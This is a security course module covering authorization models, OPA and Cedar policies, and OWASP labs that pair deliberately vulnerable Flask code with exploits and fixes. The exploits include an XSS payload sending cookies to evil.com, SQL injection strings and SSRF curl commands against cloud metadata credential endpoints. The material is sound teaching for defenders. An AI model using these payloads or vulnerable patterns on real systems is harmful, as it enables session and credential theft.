# Authorization & App Security

> **Module 06 · Course 16** — Authentication proves who you are. Authorization decides what you're allowed to do after that. And application security is everything that goes wrong between the moment a request arrives and the moment a response leaves. This module combines all three: authorization models deep enough to build a Zanzibar-style system, policy engines you'd actually deploy in production, and OWASP's top hitters — not as a checklist, but as exploitable vulnerabilities you build and break in your dojo before hardening them.

The OWASP Top 10 is not an exam to memorize. It's a list of the classes of vulnerability that show up repeatedly in real breaches. Understanding how each one works at the HTTP and code level is what separates an SDE who "knows security" from one who can find it in a PR review.

---

## RBAC, ABAC, and ReBAC — Three Models, Three Tradeoffs

### RBAC — Role-Based Access Control

RBAC assigns permissions to roles, and roles to users. It is the dominant enterprise model because it maps naturally to org-chart thinking:

```
User ──── assigned to ────▶ Role ──── grants ────▶ Permission
aadarsh                     editor                  posts:write
                                                     comments:delete
```

Implementation:

```python
# Simple flat RBAC
ROLE_PERMISSIONS = {
    "viewer":  {"posts:read", "comments:read"},
    "editor":  {"posts:read", "posts:write", "comments:read", "comments:write"},
    "admin":   {"*"},
}

def can(user_roles: list[str], permission: str) -> bool:
    for role in user_roles:
        granted = ROLE_PERMISSIONS.get(role, set())
        if "*" in granted or permission in granted:
            return True
    return False
```

RBAC's limits: **role explosion**. When permissions need to express "editor of project X, viewer of project Y," you either create `project-x-editor`, `project-y-viewer` etc. (roles multiply), or you push context into the check — which means you've actually implemented ABAC.

### ABAC — Attribute-Based Access Control

ABAC evaluates a **policy** against **attributes** of the subject, resource, and environment:

```
Policy: ALLOW if subject.department == resource.owner_department
                AND action == "read"
                AND environment.time BETWEEN 09:00 AND 18:00
```

More expressive than RBAC, but harder to reason about: the set of effective permissions isn't a table you can query — it's a policy evaluation. ABAC suits systems where permissions depend on data-driven context (time of day, geolocation, resource sensitivity level, user clearance).

The policy evaluation engine is the central point. This is where OPA, Cedar, and Casbin live — more on those below.

### ReBAC — Relationship-Based Access Control (Zanzibar)

ReBAC is Google Zanzibar's answer to ABAC's complexity. Permissions are expressed as **tuples** in a relationship graph:

```
<resource>#<relation>@<subject>

doc:123#owner@user:aadarsh
doc:123#viewer@group:eng
group:eng#member@user:priya
```

Authorization checks traverse the graph: "can user:priya view doc:123?"

```
doc:123#viewer@group:eng   → yes, group:eng has viewer
group:eng#member@user:priya → yes, priya is a member of eng
→ transitively: user:priya can view doc:123
```

This model elegantly handles nested groups, resource hierarchies, and delegation ("user:aadarsh is an owner of doc:123 and owners can grant viewer") without a combinatorial explosion of roles.

Open-source Zanzibar implementations: **SpiceDB** (AuthZed), **OpenFGA** (Auth0/Okta), **Warrant**.

The tradeoff: tuple storage grows with every relationship event, and low-latency traversal of deep graphs requires careful indexing (Zanzibar uses "zookies" — consistency tokens — to solve cross-cache read-your-writes).

### Comparison

| Model | Best for | Scales poorly when | Central question |
|-------|---------|-------------------|-----------------|
| RBAC | Static org-chart permissions, simple SaaS | N users × M resources (role explosion) | "What can this role do?" |
| ABAC | Context-sensitive, policy-driven access | Policies become hard to audit; perf under load | "Does this context match the policy?" |
| ReBAC | Collaborative apps, shared resources, hierarchy | Tuple volume; traversal depth | "Is this subject related to this resource via this relation?" |

In practice, most production systems are hybrids: coarse RBAC at the service boundary, fine-grained ABAC or ReBAC within a service.

---

## Policy Engines — OPA & Cedar

### OPA — Open Policy Agent

OPA decouples policy from application code. You write policies in **Rego** (a declarative query language), push them to OPA, and your app calls OPA's REST API for authorization decisions.

```rego
# policy.rego
package app.authz

default allow = false

allow {
    input.method == "GET"
    input.user.roles[_] == "viewer"
}

allow {
    input.method == "POST"
    input.user.roles[_] == "editor"
    input.resource.owner == input.user.id
}
```

```bash
# Query OPA
curl -s -X POST http://localhost:8181/v1/data/app/authz \
  -H "Content-Type: application/json" \
  -d '{"input": {"method": "POST", "user": {"id": "u1", "roles": ["editor"]}, "resource": {"owner": "u1"}}}' \
| grep result
# -> {"result": {"allow": true}}
```

OPA is used as a Kubernetes admission webhook (OPA Gatekeeper), as an API gateway policy engine, and embedded as a library in Go services (via `rego.New()`). Its main strength: policies are testable code in version control.

Testing OPA policies:

```bash
# policies/authz_test.rego
package app.authz_test

test_editor_can_post_own_resource {
    allow with input as {
        "method": "POST",
        "user": {"id": "u1", "roles": ["editor"]},
        "resource": {"owner": "u1"}
    }
}

test_viewer_cannot_post {
    not allow with input as {
        "method": "POST",
        "user": {"id": "u2", "roles": ["viewer"]},
        "resource": {"owner": "u2"}
    }
}
```

```bash
opa test policies/
# PASS: 2/2 tests passed
```

### Cedar — Amazon's Policy Language

Cedar is designed for fine-grained, human-readable authorization policies. Used in AWS Verified Permissions and Amazon Verified Permissions. Unlike Rego's datalog, Cedar is explicitly not Turing-complete — this enables formal verification and policy analysis:

```cedar
permit (
    principal in Group::"engineering",
    action == Action::"read",
    resource in Folder::"docs"
);

forbid (
    principal,
    action == Action::"delete",
    resource
) unless {
    principal == resource.owner
};
```

Cedar's `forbid` (explicit deny) is a key difference from OPA: it supports deny rules, making it safer for "default allow with exceptions" patterns. Its analyzer can statically prove that a policy set is never `permitAll` or contains unreachable rules — useful in compliance audits.

---

## OWASP Hands-On

The following sections treat each vulnerability as a lab exercise: you build the vulnerable pattern, observe the exploit, then apply the concrete fix. All examples run in the dojo's local Python/Flask environment.

### XSS — Cross-Site Scripting

XSS is injecting JavaScript into a page that another user's browser executes. There are three variants; stored XSS is the most dangerous because the payload persists.

**Vulnerable pattern:**

```python
# Flask route — stores user comment, renders it unescaped
@app.route("/comments", methods=["POST"])
def post_comment():
    db.execute("INSERT INTO comments VALUES (?)", [request.form["body"]])
    return redirect("/comments")

@app.route("/comments")
def view_comments():
    rows = db.execute("SELECT body FROM comments").fetchall()
    html = "".join(f"<p>{r[0]}</p>" for r in rows)   # UNSAFE: raw interpolation
    return f"<html><body>{html}</body></html>"
```

**Exploit:** Submit `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` as the comment body. Every subsequent visitor's session cookie is exfiltrated.

**Fix:**

```python
from markupsafe import escape   # Flask ships Jinja2; always use its auto-escaping

@app.route("/comments")
def view_comments():
    rows = db.execute("SELECT body FROM comments").fetchall()
    # Jinja2 auto-escapes by default in .html templates — use templates, not string concat
    return render_template("comments.html", comments=[r[0] for r in rows])
```

```html
<!-- comments.html — Jinja2 auto-escapes {{ }} -->
{% for c in comments %}
  <p>{{ c }}</p>
{% endfor %}
```

Additionally: `Content-Security-Policy: default-src 'self'` as a response header prevents injected inline scripts from executing even if you miss an escape — defense in depth.

### SQL Injection

SQLi is injecting SQL syntax into a query, causing the database to execute attacker-controlled logic.

**Vulnerable pattern:**

```python
@app.route("/users/<username>")
def get_user(username):
    row = db.execute(f"SELECT * FROM users WHERE username = '{username}'").fetchone()
    return jsonify(row)
```

**Exploit:** `GET /users/admin'--` turns the query into `SELECT * FROM users WHERE username = 'admin'--'`, bypassing any trailing condition. `GET /users/' OR '1'='1` returns all users.

**Fix:**

```python
@app.route("/users/<username>")
def get_user(username):
    row = db.execute("SELECT * FROM users WHERE username = ?", [username]).fetchone()
    return jsonify(row)
```

Always use parameterized queries (the `?` placeholder). The driver serializes the value as data, not syntax. ORM-level: use the ORM's query builder, never `.raw()` with string interpolation.

Second layer: principle of least privilege on the DB connection — the application user should have `SELECT` on the users table, not `DROP TABLE`.

### SSRF — Server-Side Request Forgery

SSRF tricks your server into making an HTTP request to an internal address the attacker can't reach directly.

**Vulnerable pattern:**

```python
@app.route("/fetch")
def fetch():
    url = request.args.get("url")
    resp = requests.get(url, timeout=5)    # UNSAFE: no URL validation
    return resp.content
```

**Exploit in a cloud environment:**

```bash
curl "https://app.corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
```

The EC2 metadata service responds with AWS credentials. The attacker now has IAM credentials from a browser request.

In a Kubernetes cluster:

```bash
curl "https://app.corp.com/fetch?url=http://kubernetes.default.svc/api/v1/namespaces"
# -> returns cluster namespace list if the pod's SA has permissions
```

**Fix:**

```python
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"https"}

def is_safe_url(url: str) -> bool:
    p = urlparse(url)
    if p.scheme not in ALLOWED_SCHEMES:
        return False
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except (socket.gaierror, ValueError):
        return False
    return True

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not is_safe_url(url):
        abort(400, "URL not allowed")
    resp = requests.get(url, timeout=5)
    return resp.content
```

Note the DNS-rebinding risk: a hostname can resolve to a public IP at validation time and an internal IP at request time. For production, use a network-level egress filter (a security group or Kubernetes NetworkPolicy) that blocks the metadata range `169.254.169.254/32`, in addition to the application-level check.

### IDOR — Insecure Direct Object Reference

IDOR exposes internal identifiers (database IDs, filenames) in URLs without verifying that the requesting user owns the referenced object.

**Vulnerable pattern:**

```python
@app.route("/invoice/<int:invoice_id>")
@login_required
def get_invoice(invoice_id):
    row = db.execute("SELECT * FROM invoices WHERE id = ?", [invoice_id]).fetchone()
    return jsonify(row)   # UNSAFE: never checks if current user owns this invoice
```

**Exploit:** `GET /invoice/1`, `GET /invoice/2` … iterate and read any user's invoices. This is a horizontal privilege escalation — same privilege level, different user's data.

**Fix:**

```python
@app.route("/invoice/<int:invoice_id>")
@login_required
def get_invoice(invoice_id):
    row = db.execute(
        "SELECT * FROM invoices WHERE id = ? AND user_id = ?",
        [invoice_id, current_user.id]
    ).fetchone()
    if not row:
        abort(404)    # 404, not 403 — don't leak existence of other users' invoices
    return jsonify(row)
```

Alternative: replace sequential integer IDs in URLs with random UUIDs or ULIDs — guessing `8f3a1b2c-...` is harder than `1, 2, 3`. But UUIDs are not a substitute for authorization checks — they reduce guessability but provide no enforcement.

### CORS Misconfiguration

CORS (Cross-Origin Resource Sharing) controls which browser origins can read responses from your API. The default browser policy blocks cross-origin reads; CORS headers selectively allow them.

**Vulnerable misconfiguration:**

```python
@app.after_request
def add_cors(response):
    origin = request.headers.get("Origin", "")
    response.headers["Access-Control-Allow-Origin"] = origin      # UNSAFE: reflects any origin
    response.headers["Access-Control-Allow-Credentials"] = "true" # UNSAFE: allows cookies
    return response
```

**Exploit:** An attacker hosts a page at `https://evil.com` that issues a credentialed XHR to `https://app.corp.com/api/profile`. The browser sends the user's session cookie; the server reflects `Access-Control-Allow-Origin: https://evil.com` + `Allow-Credentials: true`; the browser allows JavaScript to read the response. The attacker now has the user's profile data without XSS.

**Fix:**

```python
ALLOWED_ORIGINS = {"https://app.corp.com", "https://staging.corp.com"}

@app.after_request
def add_cors(response):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    # if origin not in allowlist: no CORS headers → browser blocks the read
    return response
```

Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` — the browser rejects this combination. But `*` without credentials is fine for public APIs.

### Secrets Handling

Secrets in source code is the single most common finding in developer security audits. Git history is permanent; a secret committed once and "deleted" is recoverable.

**What not to do:**

```python
DB_PASSWORD = "postgres-super-secret"       # in code
API_KEY = "sk-live-abc123"                  # in config file committed to Git
```

**Correct tiers (least to most preferred):**

```
Tier 1: Environment variables — read at startup, not in code
  DB_PASSWORD = os.environ["DB_PASSWORD"]

Tier 2: A secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager)
  secret = client.get_secret_value(SecretId="prod/db/password")["SecretString"]

Tier 3: Kubernetes Secrets + External Secrets Operator
  ESO syncs from Vault/AWS SM into a Kubernetes Secret; pod mounts it as env or file
```

For the dojo and local dev: use a `.env` file that is `.gitignore`d, loaded with `python-dotenv`.

Scanning for leaked secrets: `trufflehog` and `gitleaks` are standard tools for scanning git history and the current working tree. Run either as a pre-commit hook:

```bash
# .git/hooks/pre-commit
gitleaks protect --staged --redact --no-banner
```

### TLS Basics

TLS (Transport Layer Security) is mandatory for all production traffic — HTTP in 2026 is only acceptable for localhost. The essentials an SDE must know:

The TLS handshake establishes:
1. Which cipher suite to use (key exchange + bulk cipher + MAC)
2. Server identity — the server presents its X.509 cert; the client verifies the chain to a trusted CA
3. A shared session key derived via ECDH (no key material transmitted over the wire)

What "checking the cert" means in code:

```python
import requests

# ALWAYS verify — this is the default
resp = requests.get("https://api.corp.com", verify=True)

# NEVER do this in production
resp = requests.get("https://api.corp.com", verify=False)  # disables all TLS validation
```

`verify=False` is a 30-second "it works now" fix that permanently opens you to MitM attacks. When you see this in a PR, block it. When you inherit it in a codebase, the fix is to install the correct CA bundle with `verify="/path/to/ca-bundle.pem"`.

Common TLS gotchas:

| Scenario | The right fix |
|----------|--------------|
| Self-signed cert in dev | Point `verify=` at the self-signed cert or CA; never `verify=False` |
| Corp proxy with TLS inspection | Install the corp CA cert in the system store OR pass it via `verify=` |
| Cert expiry in prod (it will happen) | `certbot renew` or ACME auto-renew; set up expiry monitoring (`openssl s_client ... | grep notAfter`) |
| Wrong hostname (CN mismatch) | Get the right cert; SAN must include the exact hostname you're connecting to |

Minimum TLS version: enforce TLS 1.2 as a minimum; TLS 1.3 on all new deployments. TLS 1.0 and 1.1 are deprecated (RFC 8996) and actively exploitable.

---

## LGTM Stack in the Security Context

Course 17 covers the LGTM stack (Loki, Grafana, Tempo, Mimir) in depth. In a security context, the same stack becomes your detection and response foundation:

```
Attack surface                   LGTM signal
──────────────                   ──────────
Failed logins (n per minute)  →  Loki: parse app logs, alert on rate
SSRF probe attempts           →  Loki: alert on outbound 169.254/metadata requests
IDOR enumeration              →  Mimir: rate of 4xx per user, spike = enumeration scan
XSS payload in request body   →  Loki: WAF log integration, flag <script> in POST body
Cert expiry                   →  Grafana alert: TLS check exporter scraping cert NotAfter
```

A concrete Loki query for brute-force detection:

```logql
sum by (user_id) (
    count_over_time(
        {app="auth-service"} |= "authentication_failed" [5m]
    )
) > 10
```

This fires an alert when any single `user_id` accumulates more than 10 failed auth events in 5 minutes — the fingerprint of a credential-stuffing attack.

---

## Debugging Authorization & App Security

| Symptom | Likely cause | Confirm / fix |
|---------|-------------|---------------|
| Users getting 403 on resources they own | Authorization check uses stale session attribute instead of querying DB | Log the exact `user_id` and `resource.owner_id` at the check; ensure the session isn't caching a previous identity |
| IDOR: users can read each other's objects by incrementing an ID | Ownership check missing from the query | Add `AND user_id = ?` to every query that fetches user-owned objects; add an integration test with two users |
| Stored XSS payload executes in prod but not in dev | Dev uses a different template engine or output mode | Confirm `Content-Type: text/html` and Jinja2 auto-escaping is on; check for any `| safe` filter in templates |
| SSRF to metadata returns 200 in staging but 404 in prod | Cloud provider differences (e.g., IMDSv2 vs IMDSv1); or network policy blocks it in prod but not staging | Add an egress NetworkPolicy blocking `169.254.169.254/32` to staging as well |
| `Access-Control-Allow-Origin: *` with `Allow-Credentials: true` in a framework's default config | Framework CORS middleware defaulting to open — check defaults | Explicitly configure the allowlist; test with `curl -H "Origin: https://evil.com"` and verify the origin isn't reflected |
| OPA policy returns `undefined` instead of `false` | `default allow = false` missing; undefined in Rego is different from `false` | Add `default allow = false`; test with `opa eval` and the relevant input |
| Secret appears in CI logs | Framework printing env vars on startup, or an exception serializing the request object | Audit startup logs; use `SECRET_KEY=***` redaction in the logger config; never log the full request object |

> **War story.** A critical IDOR bug survived a code review at a product company. The endpoint was `/api/v1/export/<export_id>/download`. The reviewer saw `@login_required` and assumed the authorization was handled. The code behind it fetched the export by ID and streamed the file — no owner check. An attacker who enumerated UUIDs (they were sequential ULIDs, not random UUIDs) could download any user's export. The bug was found by an external pen tester, not by the team. The root cause wasn't incompetence — it was an unwritten assumption that `login_required` meant "authorized," which it doesn't. The team added a rule to the OPA policy for every export endpoint (`resource.owner == input.user.id`) and wrote an integration test that creates two users, one creates an export, and asserts the second user gets 404 when requesting it. The integration test is now a required part of the "export feature" PR template checklist. The lesson: for any endpoint that returns user-owned data, "authenticated" is necessary but never sufficient. Authorization is a separate, explicit check, and it needs a test with two users, not one.

---

## Checkpoint

You're ready to move on when you can, without looking anything up:

1. State the fundamental tradeoff between RBAC, ABAC, and ReBAC — name one class of system where each is the right choice.
2. Describe what a Zanzibar tuple looks like and walk a multi-hop graph traversal that answers "can user:priya view doc:123?" given the tuples in this module.
3. Write an OPA Rego policy for a simple `allow` rule and a test that covers both the allow and deny cases.
4. Reproduce the stored XSS attack on the vulnerable Flask snippet and apply the Jinja2 fix — explain why `Content-Security-Policy` is a second layer, not a first.
5. Reproduce the SQLi `' OR '1'='1` exploit, and explain why parameterized queries fix it at the protocol level (not just escaping).
6. Describe the SSRF-to-metadata-service attack on EC2 and Kubernetes, and explain why an application-level URL check is insufficient without a network-level egress rule.
7. Explain why IDOR should return 404 instead of 403 when an unauthorized user requests another user's resource.
8. Explain the CORS misconfiguration that allows credentialed cross-origin reads, name the two response headers involved, and describe the allowlist fix.
9. Explain why `requests.get(url, verify=False)` in a PR is a blocking concern — and what the correct alternatives are for self-signed certs and corp CA bundles.
10. Write a Loki LogQL query that alerts on more than 10 failed authentication events per `user_id` in a 5-minute window.

➡ Next up: the **Security & Auth challenges** — you've seen every attack in this module on a clean example; now you'll find and fix them in a messier, more realistic environment, under a verifier.
